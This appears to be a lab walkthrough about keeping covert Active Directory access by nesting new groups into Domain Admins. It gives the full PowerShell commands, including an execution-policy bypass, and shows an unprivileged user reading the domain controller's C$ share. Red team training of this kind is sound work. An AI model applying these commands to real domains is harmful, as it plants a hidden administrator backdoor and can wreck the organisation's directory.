# Persistence through group membership

## Warning

**A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your 
red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. 
In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make 
sure you fully understand the consequences of using these techniques and only perform them if you have prior 
approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained 
at this point instead of using these techniques. Meaning you would most likely not perform these persistence 
techniques but rather simulate them.**

The most privileged groups or resources are not always the best choice, as they are often more closely watched for 
changes by the blue team. [Exploiting permission delegation](../exploit/permissions.md) gave privileges to reset 
user passwords, which would be good for maintaining access to workstations.

A local administrator group may be less monitored than a global administrator groups, and a group nested in a 
privileged group may be the access needed.

`SSH` to `THMDC`:

    ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc

## Create groups

Launch PowerShell

    powershell -ep bypass

Create group in the People\IT OU:

    New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "THM Nest Group 1" -SamAccountName "THM_nestgroup1" -DisplayName "THM Nest Group 1" -GroupScope Global -GroupCategory Security

Create group in the People\Sales OU:

    New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "THM Nest Group 2" -SamAccountName "THM_nestgroup2" -DisplayName "THM Nest Group 2" -GroupScope Global -GroupCategory Security

Create group in the People\Consulting OU:

    New-ADGroup -Path "OU=CONSULTING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "THM Nest Group 3" -SamAccountName "THM_nestgroup3" -DisplayName "THM Nest Group 3" -GroupScope Global -GroupCategory Security

Create group in the People\Marketing OU:

    New-ADGroup -Path "OU=MARKETING,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "THM Nest Group 4" -SamAccountName "THM_nestgroup4" -DisplayName "THM Nest Group 4" -GroupScope Global -GroupCategory Security

Create group in the People\IT OU:

    New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "THM Nest Group 5" -SamAccountName "THM_nestgroup5" -DisplayName "THM Nest Group 5" -GroupScope Global -GroupCategory Security

## Nesting

Add Group 1 to Group 2

    Add-ADGroupMember -Identity 'THM_nestgroup2' -Members 'THM_nestgroup1'

Add Group 2 to Group 3

    Add-ADGroupMember -Identity 'THM_nestgroup3' -Members 'THM_nestgroup2'

Add Group 3 to Group 4

    Add-ADGroupMember -Identity 'THM_nestgroup4' -Members 'THM_nestgroup3'

Add Group 4 to Group 5

    Add-ADGroupMember -Identity 'THM_nestgroup5' -Members 'THM_nestgroup4'

Add Group 5 to Domain Admins

    Add-ADGroupMember -Identity 'Domain Admins' -Members 'THM_nestgroup5'

Add unprivileged user to Group 1

    Add-ADGroupMember -Identity 'THM_nestgroup1' -Members 'user.name'

## Verify inherited privileges

`SSH` to `thmwrk1` as the unprivileged user.

    ssh user.name@za.tryhackme.loc@thmwrk1.za.tryhackme.loc

Try accessing a privileged resource on the domain controller:

    dir \\thmdc.za.tryhackme.loc\c$\Users
 
     Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows 
     Volume Serial Number is 1634-22A9
    
     Directory of \\thmdc.za.tryhackme.loc\c$
    
    01/04/2022  08:47 AM               103 delete-vagrant-user.ps1     
    05/01/2022  09:11 AM               169 dns_entries.csv
    09/15/2018  08:19 AM    <DIR>          PerfLogs
    05/11/2022  10:32 AM    <DIR>          Program Files
    03/21/2020  09:28 PM    <DIR>          Program Files (x86)
    05/01/2022  09:17 AM             1,725 thm-network-setup-dc.ps1    
    04/25/2022  07:13 PM    <DIR>          tmp
    05/15/2022  09:16 PM    <DIR>          Tools
    04/27/2022  08:22 AM    <DIR>          Users
    04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant] 
    04/27/2022  08:12 PM    <DIR>          Windows
                   3 File(s)          1,997 bytes
                   8 Dir(s)  51,573,755,904 bytes free

If this was a real organisation, we would not be creating new groups to nest. Instead, we would make use of the 
existing groups to perform nesting. This is something you would never do on a normal red team assessment and 
almost always dechain at this point since it breaks the organisation's AD structure, and if we sufficiently break it, 
they would not be able to recover. At this point, even if the blue team was able to kick us out, the organisation 
would more than likely still have to rebuild their entire AD structure from scratch, resulting in significant damages.

